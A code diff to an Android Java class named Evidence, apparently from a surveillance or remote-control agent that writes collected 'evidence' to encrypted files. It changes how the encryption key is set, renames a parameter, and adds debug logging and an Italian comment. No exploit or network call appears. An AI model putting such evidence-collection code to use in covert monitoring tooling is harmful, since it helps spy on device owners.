@@ -15,6 +15,8 @@ import java.io.IOException;
 import java.util.Date;
 import java.util.Vector;
 
+import android.util.Log;
+
 import com.ht.RCSAndroidGUI.agent.Agent;
 import com.ht.RCSAndroidGUI.crypto.Encryption;
 import com.ht.RCSAndroidGUI.crypto.Keys;
@@ -99,6 +101,7 @@ public final class Evidence {
     };
 
     private static final long MIN_AVAILABLE_SIZE = 200 * 1024;
+	private static final String TAG = Class.class.getName();
 
     //#ifdef DEBUG
     private static Debug debug = new Debug("Evidence");
@@ -236,7 +239,7 @@ public final class Evidence {
     private Evidence() {
         evidenceCollector = EvidenceCollector.self();
         device = Device.self();
-        encryption = new Encryption(Keys.self().getConfKey());
+        
         progressive = -1;
         // timestamp = new Date();
     }
@@ -244,8 +247,8 @@ public final class Evidence {
     /**
      * Instantiates a new log.
      * 
-     * @param agent_
-     *            the agent_
+     * @param agentId
+     *            the agentId
      * @param aesKey
      *            the aes key
      */
@@ -253,14 +256,13 @@ public final class Evidence {
         this();
         //#ifdef DBC        
         Check.requires(aesKey != null, "aesKey null");
-        Check.requires(encryption != null, "encryption null");
         //#endif
 
         //agent = agent_;
         this.agentId = agentId;
         this.aesKey = aesKey;
 
-        encryption.makeKey(aesKey);
+        encryption = new Encryption(aesKey);
 
         //#ifdef DBC
         //Check.ensures(agent != null, "createLog: agent null");
@@ -288,6 +290,11 @@ public final class Evidence {
         return ret;
     }
 
+    /**
+     * Crea un'evidenza con tipo standard
+     * @param additionalData
+     * @return
+     */
     public synchronized boolean createEvidence(final byte[] additionalData) {
         return createEvidence(additionalData, convertTypeEvidence(agentId));
     }
@@ -401,11 +408,13 @@ public final class Evidence {
             
             // scriviamo la dimensione dell'header paddato
             fconn.write(Utils.intToByteArray(plainBuffer.length));
+            Log.d(TAG,Long.toString(fconn.getSize()));
             // scrittura dell'header cifrato
             fconn.append(encBuffer);
+            Log.d(TAG,Long.toString(fconn.getSize()));
 
             //#ifdef DBC
-            Check.asserts(fconn.fileSize() == encBuffer.length + 4,
+            Check.asserts(fconn.getSize() == encBuffer.length + 4,
                     "Wrong filesize");
             //#endif
 
